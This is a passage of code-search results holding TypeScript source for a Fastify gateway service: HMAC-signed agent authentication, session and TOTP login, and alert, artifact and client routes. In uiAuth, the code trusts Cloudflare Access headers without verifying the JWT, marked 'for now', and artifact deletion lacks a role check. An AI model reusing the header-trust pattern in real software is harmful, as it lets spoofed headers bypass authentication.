'cloudflare' };\n      }\n      return null;\n    }\n\n    expect(extractCfUser(headers)).toBeNull();\n  });\n});", "metadata": {"file": "gateway/src/middleware/auth.test.ts", "start_line": 401, "end_line": 409, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/middleware/auth.ts", "location": "gateway/src/middleware/auth.ts:1", "score": 0.0, "content": "import type { FastifyRequest, FastifyReply, FastifyInstance } from 'fastify';\nimport { db } from '../services/database.js';\nimport { config } from '../config.js';\nimport { verifySignature, hashBody, isTimestampValid } from '../utils/crypto.js';\n\nexport interface AuthenticatedRequest extends FastifyRequest {\n  user?: {\n    id: string;\n    username: string;\n    role: 'admin' | 'operator' | 'viewer';\n    source: 'cloudflare' | 'session' | 'wrapper';\n  };\n  runAuth?: {\n    runId: string;\n    capabilityToken: string;\n  };\n}\n\n/**\n * Wrapper (agent) authentication middleware\n * Uses HMAC signature with replay protection\n */\nexport async function wrapperAuth(\n  request: AuthenticatedRequest,\n  reply: FastifyReply\n): Promise<void> {\n  const signature = request.headers['x-signature'] as string;\n  const timestamp = parseInt(request.headers['x-timestamp'] as string, 10);\n  const nonce = request.headers['x-nonce'] as string;\n  const runId = request.headers['x-run-id'] as string;\n  const capabilityToken = request.headers['x-capability-token'] as string;\n\n  // Validate required headers\n  if (!signature || !timestamp || !nonce) {\n    reply.code(401).send({ error: 'Missing authentication headers' });\n    return;\n  }\n\n  // Check timestamp validity (clock skew)\n  if (!isTimestampValid(timestamp)) {\n    reply.code(401).send({ error: 'Request timestamp out of allowed range' });\n    return;\n  }\n\n  // Check nonce for replay protection\n  const existingNonce = db.prepare('SELECT nonce FROM nonces WHERE nonce = ?').get(nonce);\n  if (existingNonce) {\n    reply.code(401).send({ error: 'Nonce already used (replay attack detected)' });\n    return;\n  }\n\n  // Calculate body hash\n  const rawBody = (request as any).rawBody || '';\n  const bodyHash = hashBody(rawBody);\n\n  // Verify signature\n  const isValid = verifySignature(signature, {\n    method: request.method,\n    path: request.url.split('?')[0],\n    bodyHash,\n    timestamp,\n    nonce,\n    runId,\n    capabilityToken\n  });\n\n  if (!isValid) {\n    reply.code(401).send({ error: 'Invalid signature' });\n    return;\n  }\n\n  // Verify capability token if runId provided\n  if (runId && capabilityToken) {\n    const run = db.prepare('SELECT capability_token FROM runs WHERE id = ?').get(runId) as any;\n    if (!run || run.capability_token !== capabilityToken) {\n      reply.code(403).send({ error: 'Invalid capability token for run' });\n      return;\n    }\n    request.runAuth = { runId, capabilityToken };\n  }\n\n  // Store nonce to prevent replay\n  db.prepare('INSERT INTO nonces (nonce) VALUES (?)').run(nonce);\n\n  request.user = {\n    id: 'wrapper',\n    username: 'wrapper',\n    role: 'operator',\n    source: 'wrapper'\n  };\n}\n\n/**\n * UI authentication middleware\n * Supports Cloudflare Access and local session auth\n */\nexport async function uiAuth(\n  request: AuthenticatedRequest,\n  reply: FastifyReply\n): Promise<void> {\n  // Check Cloudflare Access headers first\n  const cfEmail = request.headers['cf-access-authenticated-user-email'] as string;\n  const cfJwt = request.headers['cf-access-jwt-assertion'] as string;\n\n  if (config.cfAccessTeam && cfEmail && cfJwt) {\n    // In production, verify the JWT against Cloudflare's keys\n    // For now, trust the headers if CF team is configured\n    request.user = {\n      id: `cf:${cfEmail}`,\n      username: cfEmail,\n      role: 'operator', // Could be configured per-user\n      source: 'cloudflare'\n    };\n    return;\n  }\n\n  // Fall back to session auth\n  const sessionToken = request.cookies?.session ||\n    (request.headers.authorization?.startsWith('Bearer ')\n      ? request.headers.authorization.slice(7)\n      : null);\n\n  if (!sessionToken) {\n    reply.code(401).send({ error: 'Authentication required' });\n    return;\n  }\n\n  const session = db.prepare(`\n    SELECT s.*, u.username, u.role\n    FROM sessions s\n    JOIN users u ON s.user_id = u.id\n    WHERE s.id = ? AND s.expires_at > unixepoch()\n  `).get(sessionToken) as any;\n\n  if (!session) {\n    reply.code(401).send({ error: 'Invalid or expired session' });\n    return;\n  }\n\n  request.user = {\n    id: session.user_id,\n    username: session.username,\n    role: session.role,\n    source: 'session'\n  };\n}\n\n/**\n * Require specific role\n */\nexport function requireRole(...roles: string[]) {\n  return async (request: AuthenticatedRequest, reply: FastifyReply) => {\n    if (!request.user) {\n      reply.code(401).send({ error: 'Authentication required' });\n      return;\n    }\n\n    if (!roles.includes(request.user.role)) {\n      reply.code(403).send({ error: 'Insufficient permissions' });\n      return;\n    }\n  };\n}\n\n/**\n * Audit log helper\n */\nexport function logAudit(\n  userId: string | undefined,\n  action: string,\n  targetType?: string,\n  targetId?: string,\n  details?: object,\n  ipAddress?: string\n): void {\n  db.prepare(`\n    INSERT INTO audit_log (user_id, action, target_type, target_id, details, ip_address)\n    VALUES (?, ?, ?, ?, ?, ?)\n  `).run(\n    userId || null,\n    action,\n    targetType || null,\n    targetId || null,\n    details ? JSON.stringify(details) : null,\n    ipAddress || null\n  );\n}\n\n/**\n * Plugin to capture raw body for signature verification\n */\nexport function rawBodyPlugin(fastify: FastifyInstance) {\n  fastify.addContentTypeParser(\n    'application/json',\n    { parseAs: 'string' },\n    (req, body, done) => {\n      (req as any).rawBody = body;\n      try {\n        done(null, body ? JSON.parse(body as string) : {});\n      } catch (err) {", "metadata": {"file": "gateway/src/middleware/auth.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/middleware/auth.ts", "location": "gateway/src/middleware/auth.ts:201", "score": 0.0, "content": "        done(err as Error, undefined);\n      }\n    }\n  );\n}", "metadata": {"file": "gateway/src/middleware/auth.ts", "start_line": 201, "end_line": 205, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/alerts.ts", "location": "gateway/src/routes/alerts.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { z } from 'zod';\nimport { nanoid } from 'nanoid';\nimport { db } from '../services/database.js';\nimport { uiAuth, requireRole, logAudit, type AuthenticatedRequest } from '../middleware/auth.js';\nimport { broadcastAll } from '../services/websocket.js';\n\n// Alert rule types\nconst alertRuleTypes = ['run_failed', 'waiting_approval_timeout', 'client_offline_active_runs'] as const;\n\n// Validation schemas\nconst createAlertRuleSchema = z.object({\n  name: z.string().min(1).max(100),\n  type: z.enum(alertRuleTypes),\n  config: z.object({\n    timeoutMinutes: z.number().int().min(1).max(1440).optional() // For waiting_approval_timeout\n  }).optional(),\n  enabled: z.boolean().optional()\n});\n\nconst updateAlertRuleSchema = z.object({\n  name: z.string().min(1).max(100).optional(),\n  config: z.object({\n    timeoutMinutes: z.number().int().min(1).max(1440).optional()\n  }).optional(),\n  enabled: z.boolean().optional()\n});\n\nexport interface AlertRule {\n  id: string;\n  name: string;\n  type: string;\n  config: string;\n  enabled: number;\n  created_at: number;\n}\n\nexport interface Alert {\n  id: string;\n  rule_id: string | null;\n  type: string;\n  severity: string;\n  title: string;\n  message: string | null;\n  target_type: string | null;\n  target_id: string | null;\n  acknowledged: number;\n  acknowledged_by: string | null;\n  acknowledged_at: number | null;\n  created_at: number;\n}\n\nexport async function alertsRoutes(fastify: FastifyInstance) {\n  // List alert rules\n  fastify.get('/api/alerts/rules', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const rules = db.prepare(`\n      SELECT * FROM alert_rules ORDER BY created_at DESC\n    `).all() as AlertRule[];\n\n    return rules.map(rule => ({\n      ...rule,\n      config: JSON.parse(rule.config)\n    }));\n  });\n\n  // Create alert rule (operator only)\n  fastify.post('/api/alerts/rules', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest) => {\n    const body = createAlertRuleSchema.parse(request.body);\n    const id = nanoid(12);\n\n    db.prepare(`\n      INSERT INTO alert_rules (id, name, type, config, enabled)\n      VALUES (?, ?, ?, ?, ?)\n    `).run(id, body.name, body.type, JSON.stringify(body.config || {}), body.enabled !== false ? 1 : 0);\n\n    logAudit(request.user?.id, 'alert_rule.create', 'alert_rule', id, body, request.ip);\n\n    return { id };\n  });\n\n  // Update alert rule\n  fastify.patch('/api/alerts/rules/:ruleId', {\n    preHandler: [uiAuth, requireRole('admin', 'operator')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { ruleId } = request.params as { ruleId: string };\n    const body = updateAlertRuleSchema.parse(request.body);\n\n    const rule = db.prepare('SELECT id FROM alert_rules WHERE id = ?').get(ruleId);\n    if (!rule) {\n      return reply.code(404).send({ error: 'Alert rule not found' });\n    }\n\n    const updates: string[] = [];\n    const params: any[] = [];\n\n    if (body.name !== undefined) {\n      updates.push('name = ?');\n      params.push(body.name);\n    }\n    if (body.config !== undefined) {\n      updates.push('config = ?');\n      params.push(JSON.stringify(body.config));\n    }\n    if (body.enabled !== undefined) {\n      updates.push('enabled = ?');\n      params.push(body.enabled ? 1 : 0);\n    }\n\n    if (updates.length > 0) {\n      params.push(ruleId);\n      db.prepare(`UPDATE alert_rules SET ${updates.join(', ')} WHERE id = ?`).run(...params);\n      logAudit(request.user?.id, 'alert_rule.update', 'alert_rule', ruleId, body, request.ip);\n    }\n\n    return { ok: true };\n  });\n\n  // Delete alert rule\n  fastify.delete('/api/alerts/rules/:ruleId', {\n    preHandler: [uiAuth, requireRole('admin')]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { ruleId } = request.params as { ruleId: string };\n\n    const rule = db.prepare('SELECT id FROM alert_rules WHERE id = ?').get(ruleId);\n    if (!rule) {\n      return reply.code(404).send({ error: 'Alert rule not found' });\n    }\n\n    db.prepare('DELETE FROM alert_rules WHERE id = ?').run(ruleId);\n    logAudit(request.user?.id, 'alert_rule.delete', 'alert_rule', ruleId, {}, request.ip);\n\n    return { ok: true };\n  });\n\n  // List alerts\n  fastify.get('/api/alerts', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const { acknowledged, severity, limit = '50', offset = '0' } = request.query as {\n      acknowledged?: string;\n      severity?: string;\n      limit?: string;\n      offset?: string;\n    };\n\n    let query = 'SELECT * FROM alerts WHERE 1=1';\n    const params: any[] = [];\n\n    if (acknowledged !== undefined) {\n      query += ' AND acknowledged = ?';\n      params.push(acknowledged === 'true' ? 1 : 0);\n    }\n\n    if (severity) {\n      query += ' AND severity = ?';\n      params.push(severity);\n    }\n\n    query += ' ORDER BY created_at DESC LIMIT ? OFFSET ?';\n    params.push(parseInt(limit, 10), parseInt(offset, 10));\n\n    const alerts = db.prepare(query).all(...params) as Alert[];\n\n    // Get unacknowledged count\n    const { unacknowledged } = db.prepare(\n      'SELECT COUNT(*) as unacknowledged FROM alerts WHERE acknowledged = 0'\n    ).get() as { unacknowledged: number };\n\n    return {\n      alerts,\n      unacknowledged\n    };\n  });\n\n  // Acknowledge alert\n  fastify.post('/api/alerts/:alertId/acknowledge', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { alertId } = request.params as { alertId: string };\n\n    const alert = db.prepare('SELECT id FROM alerts WHERE id = ?').get(alertId);\n    if (!alert) {\n      return reply.code(404).send({ error: 'Alert not found' });\n    }\n\n    db.prepare(`\n      UPDATE alerts\n      SET acknowledged = 1, acknowledged_by = ?, acknowledged_at = unixepoch()\n      WHERE id = ?\n    `).run(request.user?.id || null, alertId);\n\n    broadcastAll({\n      type: 'alert_acknowledged',\n      alertId\n    });\n", "metadata": {"file": "gateway/src/routes/alerts.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/alerts.ts", "location": "gateway/src/routes/alerts.ts:201", "score": 0.0, "content": "    return { ok: true };\n  });\n\n  // Acknowledge all alerts\n  fastify.post('/api/alerts/acknowledge-all', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const result = db.prepare(`\n      UPDATE alerts\n      SET acknowledged = 1, acknowledged_by = ?, acknowledged_at = unixepoch()\n      WHERE acknowledged = 0\n    `).run(request.user?.id || null);\n\n    broadcastAll({\n      type: 'alerts_all_acknowledged'\n    });\n\n    return { ok: true, count: result.changes };\n  });\n\n  // Get alert stats for dashboard\n  fastify.get('/api/alerts/stats', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const stats = db.prepare(`\n      SELECT\n        COUNT(*) as total,\n        SUM(CASE WHEN acknowledged = 0 THEN 1 ELSE 0 END) as unacknowledged,\n        SUM(CASE WHEN severity = 'critical' AND acknowledged = 0 THEN 1 ELSE 0 END) as critical,\n        SUM(CASE WHEN severity = 'warning' AND acknowledged = 0 THEN 1 ELSE 0 END) as warning\n      FROM alerts\n    `).get() as { total: number; unacknowledged: number; critical: number; warning: number };\n\n    return stats;\n  });\n}\n\n// Helper function to create an alert (called from other parts of the system)\nexport function createAlert(\n  type: string,\n  title: string,\n  options: {\n    ruleId?: string;\n    severity?: 'info' | 'warning' | 'critical';\n    message?: string;\n    targetType?: string;\n    targetId?: string;\n  } = {}\n) {\n  const id = nanoid(12);\n\n  db.prepare(`\n    INSERT INTO alerts (id, rule_id, type, severity, title, message, target_type, target_id)\n    VALUES (?, ?, ?, ?, ?, ?, ?, ?)\n  `).run(\n    id,\n    options.ruleId || null,\n    type,\n    options.severity || 'info',\n    title,\n    options.message || null,\n    options.targetType || null,\n    options.targetId || null\n  );\n\n  broadcastAll({\n    type: 'new_alert',\n    alertId: id,\n    alertType: type,\n    severity: options.severity || 'info',\n    title\n  });\n\n  return id;\n}", "metadata": {"file": "gateway/src/routes/alerts.ts", "start_line": 201, "end_line": 275, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/artifacts.ts", "location": "gateway/src/routes/artifacts.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { nanoid } from 'nanoid';\nimport { createWriteStream, existsSync, mkdirSync, statSync, createReadStream } from 'fs';\nimport { join, basename } from 'path';\nimport { pipeline } from 'stream/promises';\nimport { db } from '../services/database.js';\nimport { config } from '../config.js';\nimport { wrapperAuth, uiAuth, type AuthenticatedRequest } from '../middleware/auth.js';\nimport { broadcastToRun } from '../services/websocket.js';\n\nexport async function artifactRoutes(fastify: FastifyInstance) {\n  // Ensure artifacts directory exists\n  if (!existsSync(config.artifactsDir)) {\n    mkdirSync(config.artifactsDir, { recursive: true });\n  }\n\n  // Wrapper: upload artifact\n  fastify.post('/api/ingest/artifact', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const runId = request.runAuth?.runId;\n    if (!runId) {\n      return reply.code(400).send({ error: 'Run ID required' });\n    }\n\n    const data = await request.file();\n    if (!data) {\n      return reply.code(400).send({ error: 'No file uploaded' });\n    }\n\n    // Validate file size\n    const contentLength = parseInt(request.headers['content-length'] || '0', 10);\n    if (contentLength > config.maxArtifactSize) {\n      return reply.code(413).send({ error: 'File too large' });\n    }\n\n    // Create run artifact directory\n    const runArtifactDir = join(config.artifactsDir, runId);\n    if (!existsSync(runArtifactDir)) {\n      mkdirSync(runArtifactDir, { recursive: true });\n    }\n\n    // Generate safe filename\n    const id = nanoid(12);\n    const safeName = basename(data.filename).replace(/[^a-zA-Z0-9._-]/g, '_');\n    const fileName = `${id}_${safeName}`;\n    const filePath = join(runArtifactDir, fileName);\n\n    // Stream file to disk\n    const writeStream = createWriteStream(filePath);\n    let size = 0;\n\n    try {\n      for await (const chunk of data.file) {\n        size += chunk.length;\n        if (size > config.maxArtifactSize) {\n          writeStream.destroy();\n          throw new Error('File size exceeded limit during upload');\n        }\n        writeStream.write(chunk);\n      }\n      writeStream.end();\n    } catch (err) {\n      return reply.code(413).send({ error: 'File too large' });\n    }\n\n    // Determine artifact type from filename\n    const ext = safeName.split('.').pop()?.toLowerCase() || 'unknown';\n    const typeMap: Record<string, string> = {\n      log: 'log',\n      txt: 'text',\n      json: 'json',\n      diff: 'diff',\n      patch: 'patch',\n      md: 'markdown'\n    };\n    const type = typeMap[ext] || 'file';\n\n    // Record in database\n    db.prepare(`\n      INSERT INTO artifacts (id, run_id, name, type, size, path)\n      VALUES (?, ?, ?, ?, ?, ?)\n    `).run(id, runId, safeName, type, size, filePath);\n\n    // Broadcast artifact event\n    broadcastToRun(runId, {\n      type: 'artifact_uploaded',\n      artifactId: id,\n      name: safeName,\n      artifactType: type,\n      size\n    });\n\n    return { ok: true, artifactId: id, name: safeName, size };\n  });\n\n  // List artifacts for a run\n  fastify.get('/api/runs/:runId/artifacts', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { runId } = request.params as { runId: string };\n\n    const run = db.prepare('SELECT id FROM runs WHERE id = ?').get(runId);\n    if (!run) {\n      return reply.code(404).send({ error: 'Run not found' });\n    }\n\n    const artifacts = db.prepare(`\n      SELECT id, name, type, size, created_at\n      FROM artifacts WHERE run_id = ?\n      ORDER BY created_at DESC\n    `).all(runId);\n\n    return artifacts;\n  });\n\n  // Download artifact\n  fastify.get('/api/artifacts/:artifactId', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { artifactId } = request.params as { artifactId: string };\n\n    const artifact = db.prepare(`\n      SELECT id, name, type, size, path\n      FROM artifacts WHERE id = ?\n    `).get(artifactId) as any;\n\n    if (!artifact) {\n      return reply.code(404).send({ error: 'Artifact not found' });\n    }\n\n    if (!existsSync(artifact.path)) {\n      return reply.code(404).send({ error: 'Artifact file not found' });\n    }\n\n    // Set appropriate headers\n    const mimeTypes: Record<string, string> = {\n      log: 'text/plain',\n      text: 'text/plain',\n      json: 'application/json',\n      diff: 'text/x-diff',\n      patch: 'text/x-diff',\n      markdown: 'text/markdown',\n      file: 'application/octet-stream'\n    };\n\n    reply.header('Content-Type', mimeTypes[artifact.type] || 'application/octet-stream');\n    reply.header('Content-Disposition', `attachment; filename=\"${artifact.name}\"`);\n    reply.header('Content-Length', artifact.size);\n\n    return reply.send(createReadStream(artifact.path));\n  });\n\n  // Delete artifact\n  fastify.delete('/api/artifacts/:artifactId', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const { artifactId } = request.params as { artifactId: string };\n\n    const artifact = db.prepare('SELECT id, path FROM artifacts WHERE id = ?').get(artifactId) as any;\n    if (!artifact) {\n      return reply.code(404).send({ error: 'Artifact not found' });\n    }\n\n    // Delete file if exists\n    if (existsSync(artifact.path)) {\n      const { unlink } = await import('fs/promises');\n      await unlink(artifact.path);\n    }\n\n    // Delete from database\n    db.prepare('DELETE FROM artifacts WHERE id = ?').run(artifactId);\n\n    return { ok: true };\n  });\n}", "metadata": {"file": "gateway/src/routes/artifacts.ts", "start_line": 1, "end_line": 176, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/auth.ts", "location": "gateway/src/routes/auth.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { z } from 'zod';\nimport { nanoid } from 'nanoid';\nimport argon2 from 'argon2';\nimport { authenticator } from 'otplib';\nimport { db } from '../services/database.js';\nimport { config } from '../config.js';\nimport { generateSessionToken } from '../utils/crypto.js';\nimport { uiAuth, logAudit, type AuthenticatedRequest } from '../middleware/auth.js';\n\n// Validation schemas\nconst loginSchema = z.object({\n  username: z.string().min(1).max(100),\n  password: z.string().min(1).max(200),\n  totpCode: z.string().length(6).optional()\n});\n\nconst setupSchema = z.object({\n  username: z.string().min(3).max(50).regex(/^[a-zA-Z0-9_-]+$/),\n  password: z.string().min(12).max(200),\n  enableTotp: z.boolean().optional()\n});\n\nconst SESSION_DURATION = 24 * 60 * 60; // 24 hours\n\nexport async function authRoutes(fastify: FastifyInstance) {\n  // Check if initial setup is needed\n  fastify.get('/api/auth/status', async () => {\n    const userCount = (db.prepare('SELECT COUNT(*) as count FROM users').get() as any).count;\n    const cfEnabled = !!config.cfAccessTeam;\n\n    return {\n      setupRequired: userCount === 0 && !cfEnabled,\n      cloudflareEnabled: cfEnabled,\n      localAuthEnabled: userCount > 0\n    };\n  });\n\n  // Initial setup - create first admin user\n  fastify.post('/api/auth/setup', async (request, reply) => {\n    const userCount = (db.prepare('SELECT COUNT(*) as count FROM users').get() as any).count;\n    if (userCount > 0) {\n      return reply.code(400).send({ error: 'Setup already completed' });\n    }\n\n    const body = setupSchema.parse(request.body);\n\n    // Hash password\n    const passwordHash = await argon2.hash(body.password, {\n      type: argon2.argon2id,\n      memoryCost: 65536,\n      timeCost: 3,\n      parallelism: 4\n    });\n\n    // Generate TOTP secret if requested\n    let totpSecret: string | null = null;\n    let totpUri: string | null = null;\n\n    if (body.enableTotp) {\n      totpSecret = authenticator.generateSecret();\n      totpUri = authenticator.keyuri(body.username, 'AiRemoteCoder', totpSecret);\n    }\n\n    const userId = nanoid(12);\n    db.prepare(`\n      INSERT INTO users (id, username, password_hash, totp_secret, role)\n      VALUES (?, ?, ?, ?, 'admin')\n    `).run(userId, body.username, passwordHash, totpSecret);\n\n    logAudit(userId, 'user.setup', 'user', userId, { username: body.username }, request.ip);\n\n    return {\n      ok: true,\n      userId,\n      totpUri,\n      message: totpSecret\n        ? 'Admin user created. Scan the TOTP QR code to enable two-factor authentication.'\n        : 'Admin user created.'\n    };\n  });\n\n  // Login\n  fastify.post('/api/auth/login', async (request, reply) => {\n    const body = loginSchema.parse(request.body);\n\n    const user = db.prepare(`\n      SELECT id, username, password_hash, totp_secret, role\n      FROM users WHERE username = ?\n    `).get(body.username) as any;\n\n    if (!user) {\n      // Prevent timing attacks by still doing hash comparison\n      await argon2.hash('dummy');\n      logAudit(undefined, 'login.failed', 'user', undefined, { username: body.username, reason: 'user_not_found' }, request.ip);\n      return reply.code(401).send({ error: 'Invalid credentials' });\n    }\n\n    // Verify password\n    const validPassword = await argon2.verify(user.password_hash, body.password);\n    if (!validPassword) {\n      logAudit(user.id, 'login.failed', 'user', user.id, { reason: 'invalid_password' }, request.ip);\n      return reply.code(401).send({ error: 'Invalid credentials' });\n    }\n\n    // Verify TOTP if enabled\n    if (user.totp_secret) {\n      if (!body.totpCode) {\n        return reply.code(401).send({ error: 'TOTP code required', totpRequired: true });\n      }\n\n      const validTotp = authenticator.verify({\n        token: body.totpCode,\n        secret: user.totp_secret\n      });\n\n      if (!validTotp) {\n        logAudit(user.id, 'login.failed', 'user', user.id, { reason: 'invalid_totp' }, request.ip);\n        return reply.code(401).send({ error: 'Invalid TOTP code' });\n      }\n    }\n\n    // Create session\n    const sessionId = generateSessionToken();\n    const expiresAt = Math.floor(Date.now() / 1000) + SESSION_DURATION;\n\n    db.prepare(`\n      INSERT INTO sessions (id, user_id, expires_at)\n      VALUES (?, ?, ?)\n    `).run(sessionId, user.id, expiresAt);\n\n    logAudit(user.id, 'login.success', 'user', user.id, {}, request.ip);\n\n    // Set session cookie\n    reply.setCookie('session', sessionId, {\n      httpOnly: true,\n      secure: config.tlsEnabled,\n      sameSite: 'strict',\n      maxAge: SESSION_DURATION,\n      path: '/'\n    });\n\n    return {\n      ok: true,\n      user: {\n        id: user.id,\n        username: user.username,\n        role: user.role\n      },\n      expiresAt\n    };\n  });\n\n  // Logout\n  fastify.post('/api/auth/logout', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const sessionToken = request.cookies?.session;\n    if (sessionToken) {\n      db.prepare('DELETE FROM sessions WHERE id = ?').run(sessionToken);\n      logAudit(request.user?.id, 'logout', 'session', sessionToken, {}, request.ip);\n    }\n\n    reply.clearCookie('session');\n    return { ok: true };\n  });\n\n  // Get current user\n  fastify.get('/api/auth/me', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    return {\n      user: request.user\n    };\n  });\n\n  // Refresh session\n  fastify.post('/api/auth/refresh', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const oldSessionToken = request.cookies?.session;\n    if (!oldSessionToken) {\n      return reply.code(401).send({ error: 'No session' });\n    }\n\n    // Create new session\n    const sessionId = generateSessionToken();\n    const expiresAt = Math.floor(Date.now() / 1000) + SESSION_DURATION;\n\n    db.prepare('DELETE FROM sessions WHERE id = ?').run(oldSessionToken);\n    db.prepare(`\n      INSERT INTO sessions (id, user_id, expires_at)\n      VALUES (?, ?, ?)\n    `).run(sessionId, request.user!.id, expiresAt);\n\n    reply.setCookie('session', sessionId, {\n      httpOnly: true,\n      secure: config.tlsEnabled,\n      sameSite: 'strict',\n      maxAge: SESSION_DURATION,", "metadata": {"file": "gateway/src/routes/auth.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/auth.ts", "location": "gateway/src/routes/auth.ts:201", "score": 0.0, "content": "      path: '/'\n    });\n\n    return { ok: true, expiresAt };\n  });\n\n  // Add additional user (admin only)\n  fastify.post('/api/auth/users', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    if (request.user?.role !== 'admin') {\n      return reply.code(403).send({ error: 'Admin required' });\n    }\n\n    const body = z.object({\n      username: z.string().min(3).max(50).regex(/^[a-zA-Z0-9_-]+$/),\n      password: z.string().min(12).max(200),\n      role: z.enum(['admin', 'operator', 'viewer'])\n    }).parse(request.body);\n\n    // Check if username exists\n    const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(body.username);\n    if (existing) {\n      return reply.code(400).send({ error: 'Username already exists' });\n    }\n\n    const passwordHash = await argon2.hash(body.password, {\n      type: argon2.argon2id,\n      memoryCost: 65536,\n      timeCost: 3,\n      parallelism: 4\n    });\n\n    const userId = nanoid(12);\n    db.prepare(`\n      INSERT INTO users (id, username, password_hash, role)\n      VALUES (?, ?, ?, ?)\n    `).run(userId, body.username, passwordHash, body.role);\n\n    logAudit(request.user.id, 'user.create', 'user', userId, { username: body.username, role: body.role }, request.ip);\n\n    return { ok: true, userId };\n  });\n}", "metadata": {"file": "gateway/src/routes/auth.ts", "start_line": 201, "end_line": 244, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/routes/clients.ts", "location": "gateway/src/routes/clients.ts:1", "score": 0.0, "content": "import type { FastifyInstance } from 'fastify';\nimport { z } from 'zod';\nimport { nanoid } from 'nanoid';\nimport { db } from '../services/database.js';\nimport { uiAuth, wrapperAuth, requireRole, logAudit, type AuthenticatedRequest } from '../middleware/auth.js';\nimport { broadcastAll } from '../services/websocket.js';\n\n// Validation schemas\nconst registerClientSchema = z.object({\n  displayName: z.string().min(1).max(100),\n  agentId: z.string().min(1).max(100),\n  version: z.string().optional(),\n  capabilities: z.array(z.string()).optional()\n});\n\nconst updateClientSchema = z.object({\n  displayName: z.string().min(1).max(100).optional(),\n  operatorEnabled: z.boolean().optional()\n});\n\nconst heartbeatSchema = z.object({\n  agentId: z.string().min(1).max(100)\n});\n\nexport interface Client {\n  id: string;\n  display_name: string;\n  agent_id: string;\n  last_seen_at: number;\n  version: string | null;\n  capabilities: string | null;\n  status: string;\n  operator_enabled: number;\n  metadata: string | null;\n  created_at: number;\n}\n\nexport async function clientsRoutes(fastify: FastifyInstance) {\n  // Register or update a client (from wrapper)\n  fastify.post('/api/clients/register', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const body = registerClientSchema.parse(request.body);\n    const now = Math.floor(Date.now() / 1000);\n\n    // Check if client already exists by agentId\n    const existing = db.prepare(\n      'SELECT id FROM clients WHERE agent_id = ?'\n    ).get(body.agentId) as { id: string } | undefined;\n\n    if (existing) {\n      // Update existing client\n      db.prepare(`\n        UPDATE clients\n        SET display_name = ?, last_seen_at = ?, version = ?, capabilities = ?, status = 'online'\n        WHERE agent_id = ?\n      `).run(\n        body.displayName,\n        now,\n        body.version || null,\n        body.capabilities ? JSON.stringify(body.capabilities) : null,\n        body.agentId\n      );\n\n      broadcastAll({\n        type: 'client_updated',\n        clientId: existing.id,\n        status: 'online'\n      });\n\n      return { id: existing.id, updated: true };\n    }\n\n    // Create new client\n    const id = nanoid(12);\n    db.prepare(`\n      INSERT INTO clients (id, display_name, agent_id, last_seen_at, version, capabilities, status)\n      VALUES (?, ?, ?, ?, ?, ?, 'online')\n    `).run(\n      id,\n      body.displayName,\n      body.agentId,\n      now,\n      body.version || null,\n      body.capabilities ? JSON.stringify(body.capabilities) : null\n    );\n\n    broadcastAll({\n      type: 'client_registered',\n      clientId: id,\n      displayName: body.displayName\n    });\n\n    return { id, created: true };\n  });\n\n  // Heartbeat from wrapper\n  fastify.post('/api/clients/heartbeat', {\n    preHandler: [wrapperAuth]\n  }, async (request: AuthenticatedRequest, reply) => {\n    const body = heartbeatSchema.parse(request.body);\n    const now = Math.floor(Date.now() / 1000);\n\n    const result = db.prepare(`\n      UPDATE clients\n      SET last_seen_at = ?, status = 'online'\n      WHERE agent_id = ?\n    `).run(now, body.agentId);\n\n    if (result.changes === 0) {\n      return reply.code(404).send({ error: 'Client not registered' });\n    }\n\n    return { ok: true, timestamp: now };\n  });\n\n  // List clients (UI)\n  fastify.get('/api/clients', {\n    preHandler: [uiAuth]\n  }, async (request: AuthenticatedRequest) => {\n    const { status, search, limit = '50', offset = '0' } = request.query as {\n      status?: string;\n      search?: string;\n      limit?: string;\n      offset?: string;\n    };\n\n    let query = 'SELECT * FROM clients WHERE 1=1';\n    const params: any[] = [];\n\n    if (status && status !== 'all') {\n      query += ' AND status = ?';\n      params.push(status);\n    }\n\n    if (search) {\n      query += ' AND (display_name LIKE ? OR agent_id LIKE ?)';\n      params.push(`%${search}%`, `%${search}%`);\n    }\n\n    query += ' ORDER BY last_seen_at DESC LIMIT ? OFFSET ?';\n    params.push(parseInt(limit, 10), parseInt(offset, 10));\n\n    const clients = db.prepare(query).all(...params) as Client[];\n\n    // Get run counts for each client\n    const clientsWithCounts = clients.map(client => {\n      const runCounts = db.prepare(`\n        SELECT\n          COUNT(*) as total,\n          SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END) as running,\n          SUM(CASE WHEN 